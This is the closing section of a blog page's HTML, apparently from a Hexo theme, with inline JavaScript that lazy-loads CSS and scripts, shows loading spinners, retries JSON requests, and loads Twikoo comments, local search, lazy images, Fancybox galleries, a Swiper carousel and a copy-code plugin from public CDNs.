    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
